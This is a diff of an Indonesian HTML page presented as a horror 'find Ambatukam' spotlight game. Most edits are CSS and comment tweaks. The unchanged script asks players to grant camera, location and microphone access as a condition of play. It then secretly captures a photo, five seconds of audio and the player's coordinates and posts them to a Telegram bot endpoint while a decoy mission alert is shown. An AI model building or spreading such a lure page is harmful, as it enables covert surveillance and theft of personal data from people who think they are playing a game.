@@ -6,6 +6,9 @@
   <title>Horror Ambatukam Hunt</title>
   <style>
     /* --- Pengaturan Dasar --- */
+    * {
+      box-sizing: border-box;
+    }
     body {
       margin: 0;
       padding: 0;
@@ -14,6 +17,8 @@
       height: 100vh;
       overflow: hidden;
       position: relative;
+      /* Untuk mendukung gesture touch dengan lebih baik */
+      touch-action: none;
     }
     /* Background video */
     #bgVideo {
@@ -25,7 +30,7 @@
       object-fit: cover;
       z-index: -2;
     }
-    /* Konten Sambutan (intro) — ditampilkan di belakang overlay */
+    /* Konten Sambutan (Intro) — diletakkan di belakang overlay */
     #introText {
       position: absolute;
       top: 50%;
@@ -33,14 +38,15 @@
       transform: translate(-50%, -50%);
       text-align: center;
       color: white;
-      z-index: 1;  /* Di bawah overlay */
+      z-index: 1;
+      padding: 0 20px;
     }
     #introText h1 {
-      font-size: 3em;
+      font-size: 2.5rem;
       margin-bottom: 10px;
     }
     #introText p {
-      font-size: 1.2em;
+      font-size: 1.2rem;
       margin-bottom: 20px;
     }
     /* Tombol di halaman sambutan */
@@ -49,14 +55,14 @@
       background-color: red;
       color: white;
       border: none;
-      font-size: 1.2em;
+      font-size: 1.2rem;
       cursor: pointer;
       border-radius: 5px;
     }
     #startGameBtn:hover {
       background-color: darkred;
     }
-    /* Kontainer foto (game) — tidak tampil saat sambutan */
+    /* Kontainer Game (Foto & tombol Lanjut) */
     #photoContainer {
       display: none;
       position: absolute;
@@ -65,20 +71,21 @@
       transform: translate(-50%, -50%);
       text-align: center;
       z-index: 1;
+      padding: 0 20px;
     }
     #photoContainer img {
-      max-width: 80%;
+      max-width: 90%;
       height: auto;
       margin-bottom: 20px;
     }
-    /* Tombol “Lanjut” (di game) */
+    /* Tombol “Lanjut” */
     #nextBtn {
       display: none;
       padding: 10px 30px;
       background-color: green;
       color: white;
       border: none;
-      font-size: 1.2em;
+      font-size: 1.2rem;
       cursor: pointer;
       border-radius: 5px;
       position: absolute;
@@ -97,7 +104,7 @@
       left: 0;
       right: 0;
       bottom: 0;
-      pointer-events: none; /* biarkan interaksi pada konten di belakang */
+      pointer-events: none;
       z-index: 10;
     }
     .light {
@@ -105,7 +112,7 @@
       width: 300px;
       height: 300px;
       border-radius: 50%;
-      /* Box-shadow besar untuk menggelapkan seluruh layar kecuali area lingkaran */
+      /* Menggunakan box-shadow untuk menggelapkan layar kecuali area lingkaran */
       box-shadow: 400vh 0px 0px 400vw rgba(0,0,0,0.99);
     }
     .shadow {
@@ -114,7 +121,7 @@
       border-radius: 50%;
       box-shadow: inset 4px 0 37px 53px rgba(0,0,0,0.9);
     }
-    /* End Popup (pada game) */
+    /* End Popup (setelah foto terakhir) */
     #endPopup {
       display: none;
       position: fixed;
@@ -127,14 +134,17 @@
       text-align: center;
       color: white;
       z-index: 12;
+      width: 80%;
+      max-width: 400px;
     }
     #endPopup h2 {
       margin-bottom: 20px;
+      font-size: 1.5rem;
     }
     #endPopup button {
       padding: 10px 30px;
       margin: 10px;
-      font-size: 1.2em;
+      font-size: 1rem;
       border: none;
       border-radius: 5px;
       cursor: pointer;
@@ -152,6 +162,29 @@
     #endPopup #yesBtn:hover {
       background-color: darkgreen;
     }
+    /* Media queries untuk responsivitas */
+    @media (max-width: 768px) {
+      #introText h1 {
+        font-size: 2rem;
+      }
+      #introText p {
+        font-size: 1rem;
+      }
+      #startGameBtn {
+        font-size: 1rem;
+        padding: 8px 20px;
+      }
+      #nextBtn {
+        font-size: 1rem;
+        padding: 8px 20px;
+      }
+      .light {
+        width: 200px;
+        height: 200px;
+        /* Kurangi bayangan jika layar lebih kecil */
+        box-shadow: 300vh 0px 0px 300vw rgba(0,0,0,0.99);
+      }
+    }
   </style>
 </head>
 <body>
@@ -160,14 +193,14 @@
     <source src="rented-bunny.gif" type="video/gif" />
   </video>
 
-  <!-- Konten Sambutan (Intro) — ditempatkan di belakang overlay -->
+  <!-- Konten Sambutan (Intro) -->
   <div id="introText">
     <h1>Selamat datang di Horror Ambatukam Hunt</h1>
     <p>Izinkan semua kamera, lokasi, dan suara untuk lanjut bermain game ini</p>
     <button id="startGameBtn">Izinkan dan Mulai</button>
   </div>
 
-  <!-- Kontainer Game (Foto & Lanjut) -->
+  <!-- Kontainer Game (Foto) -->
   <div id="photoContainer">
     <img id="photoSlide" src="" alt="Ambatukam Image" />
   </div>
@@ -194,7 +227,7 @@
   </audio>
 
   <script>
-    // Array foto yang akan ditampilkan pada game
+    // Array foto untuk game
     const photos = [
       "photo1.jpg", "photo2.jpg", "photo3.jpg", "photo4.jpg", "photo5.jpg",
       "photo6.jpg", "photo7.jpg", "photo8.jpg", "photo9.png"
@@ -211,8 +244,9 @@
     const endPopup = document.getElementById('endPopup');
     const noBtn = document.getElementById('noBtn');
     const yesBtn = document.getElementById('yesBtn');
+    const light = document.getElementById('light');
 
-    // Event listener untuk tombol popup akhir (setelah foto terakhir)
+    // Event listener untuk tombol popup akhir
     noBtn.addEventListener('click', () => {
       window.location.href = 'https://youtu.be/8241aX1ArU0?si=mehpHFjZE3lXF4Y1';
     });
@@ -221,9 +255,9 @@
       window.location.href = `https://wa.me/6281319865384?text=${message}`;
     });
 
-    // Mulai game saat tombol "Izinkan dan Mulai" ditekan pada halaman sambutan
+    // Mulai game ketika tombol "Izinkan dan Mulai" ditekan
     startGameBtn.addEventListener('click', async () => {
-      // Sembunyikan konten sambutan (intro)
+      // Sembunyikan konten sambutan
       introText.style.display = 'none';
       await startGame();
     });
@@ -236,16 +270,15 @@
         const location = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject);
         });
-
+        
         alert("Misi Kamu: Carikan Ambatukam dibalik objek yang menghalangi (DILIAT BAIK-BAIK). Jika ketemu screenshot ambatukam itu, kirimkan ke pencipta permainan ini untuk mendapatkan hadiah spesial.");
-
-        // Tangkap foto dan audio untuk dikirim ke Telegram
+        
+        // Tangkap foto dan audio untuk dikirim (fungsi contoh)
         capturePhotoAndAudio(location.coords);
         // Tampilkan kontainer game (foto) dan tombol "Lanjut"
         photoContainer.style.display = 'block';
         nextBtn.style.display = 'block';
         showPhoto(currentPhotoIndex);
-
       } catch (error) {
         alert("Akses ditolak. Game tidak bisa dilanjutkan.");
       }
@@ -276,13 +309,15 @@
         mediaRecorder.stop();
         mediaRecorder.onstop = () => {
           const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+          // Fungsi sendToTelegram sebagai contoh
           sendToTelegram(imageData, coords, audioBlob);
         };
       }, 5000);
     }
 
+    // Contoh fungsi pengiriman ke Telegram (sesuaikan token dan chatId Anda)
     function sendToTelegram(imageData, location, audioBlob) {
-      // Contoh: kirim lokasi
+      // Kirim lokasi
       fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendLocation`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -329,9 +364,7 @@
       photoSlide.src = photos[index];
     }
 
-    // Saat tombol "Lanjut" ditekan:
-    // Jika belum di foto terakhir, tampilkan foto berikutnya.
-    // Jika sudah di foto terakhir, tampilkan popup akhir.
+    // Tombol "Lanjut": jika belum foto terakhir, lanjutkan; jika sudah, tampilkan popup akhir
     nextBtn.addEventListener('click', () => {
       if (currentPhotoIndex === photos.length - 1) {
         endPopup.style.display = 'block';
@@ -341,21 +374,22 @@
       }
     });
 
-    // Update posisi "light" (spotlight) sesuai gerakan kursor/touch
-    const light = document.getElementById('light');
+    // Fungsi update posisi spotlight (senter)
     function update(e) {
       let x, y;
       if (e.touches && e.touches.length > 0) {
-        x = e.touches[0].clientX - 150;
-        y = e.touches[0].clientY - 150;
+        x = e.touches[0].clientX - (light.offsetWidth / 2);
+        y = e.touches[0].clientY - (light.offsetHeight / 2);
       } else {
-        x = e.clientX - 150;
-        y = e.clientY - 150;
+        x = e.clientX - (light.offsetWidth / 2);
+        y = e.clientY - (light.offsetHeight / 2);
       }
       light.style.transform = `translate(${x}px, ${y}px)`;
     }
+    // Event listener untuk mouse dan touch (tambahkan touchstart untuk responsivitas di mobile)
     document.addEventListener('mousemove', update);
     document.addEventListener('touchmove', update);
+    document.addEventListener('touchstart', update);
   </script>
 </body>
 </html>
